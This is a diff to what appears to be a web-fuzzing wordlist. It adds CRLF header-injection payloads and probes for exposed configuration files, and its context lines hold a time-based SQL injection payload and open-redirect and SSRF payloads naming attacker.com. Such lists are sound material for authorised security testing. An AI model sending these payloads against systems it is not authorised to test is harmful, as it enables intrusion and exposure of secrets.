@@ -1,6 +1,12 @@
+%0d%0aSet-Cookie:test=test;domain=.test;
+%0dSet-Cookie:test=test;domain=.test;
+v2/_catalog
+manifest.plist
 config?public=true
 users?public=true
 user/group?public=true
+nodemon.json
+assets/env.js
 sitemap.xml?offset=1;SELECT IF((8303>8302),SLEEP(9),2356)#
 _next/image?url=/\/\google.com
 ?next=https://google.com
@@ -8,12 +14,14 @@ _ipx/w_200/https:%2f%2fexample.com%5c@attacker.com%2fattack.svg
 .well-known/apple-app-site-association
 .well-known/openpgpkey 
 .well-known/assetlinks.json
+.well-known/matrix/server
+.well-known/shopify/monorail
 .well-known/webfinger?rel=http://openid.net/specs/connect/1.0/issuer&resource=acct://user@host
 .well-known/webfinger?rel=http://openid.net/specs/connect/1.0/issuer&resource=https://host/user
 .well-known/openid-configuration
 .well-known/jwks.json
 .well-known/oauth-authorization-server
-,well-known/change-password
+.well-known/change-password
 .snapshot
 !.gitignore
 !.htaccess
